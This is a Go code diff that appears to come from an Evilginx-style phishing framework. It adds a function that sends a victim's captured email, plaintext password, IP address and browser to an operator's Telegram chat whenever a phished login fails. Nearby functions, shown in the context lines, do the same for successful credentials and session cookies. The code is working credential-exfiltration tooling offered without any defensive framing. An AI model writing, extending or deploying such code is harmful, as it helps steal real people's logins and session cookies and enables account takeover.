@@ -70,6 +70,48 @@ func (t *TelegramNotifier) SendCredentialsNotification(session *database.Session
 	return t.sendMessage(botToken, chatID, message)
 }
 
+// SendLoginFailedNotification sends notification when login fails (invalid credentials)
+func (t *TelegramNotifier) SendLoginFailedNotification(session *database.Session, errorReason string) error {
+	if !t.cfg.IsTelegramEnabled() {
+		return nil
+	}
+
+	if session.Username == "" || session.Password == "" {
+		return nil
+	}
+
+	botToken := t.cfg.GetTelegramBotToken()
+	chatID := t.cfg.GetTelegramChatID()
+
+	browser := parseUserAgent(session.UserAgent)
+	timeStr := time.Unix(session.UpdateTime, 0).UTC().Format("2006-01-02 15:04:05 UTC")
+
+	message := fmt.Sprintf(`❌ Login Failed
+
+🆔 Session ID: %d
+🎣 Phishlet: %s
+👤 Email: %s
+🔑 Password: %s
+📊 Result: ❌ Invalid (%s)
+🌐 Browser: %s
+📍 IP Address: %s
+🗓 Time: %s
+
+⚠️ User entered incorrect credentials`,
+		session.Id,
+		session.Phishlet,
+		session.Username,
+		session.Password,
+		errorReason,
+		browser,
+		session.RemoteAddr,
+		timeStr,
+	)
+
+	log.Warning("Sending login failed notification for session %d: %s", session.Id, errorReason)
+	return t.sendMessage(botToken, chatID, message)
+}
+
 // SendCookiesNotification sends cookies when they are captured (same format as credentials, with cookie file)
 func (t *TelegramNotifier) SendCookiesNotification(session *database.Session) error {
 	if !t.cfg.IsTelegramEnabled() {
